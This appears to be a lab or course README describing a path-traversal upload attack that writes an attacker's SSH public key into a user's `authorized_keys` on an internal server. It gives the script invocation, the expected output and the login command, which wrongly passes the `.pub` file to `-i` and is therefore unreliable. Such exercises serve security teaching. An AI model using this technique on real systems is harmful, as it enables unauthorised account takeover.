# Attack 5 - Uploading files to Dropbox

In this attack, we alter the filename to upload to `../../.ssh/authorized_keys`.
There is no checking for malicious filename inputs.

Running the script requires specifying a public SSH key to upload.

Example:
```bash
python3 code/solutions/attack_5/main.py ~/.ssh/id_rsa.pub
```
Then it uploads the file to `https://dropbox.internal.regjeringen.uiaikt.no/`.

Then you should see the printed response: `File uploaded to: /home/ingridnilsen/.ssh/authorized_keys`

When that is done, you should be able to sign into server at `10.13.13.253` with username `ingridnilsen`. Wireguard is required to reach this server.

Given the SSH key is in `.ssh/id_rsa`, the command would be `ssh -i ~/.ssh/id_rsa.pub ingridnilsen@10.13.13.253`.

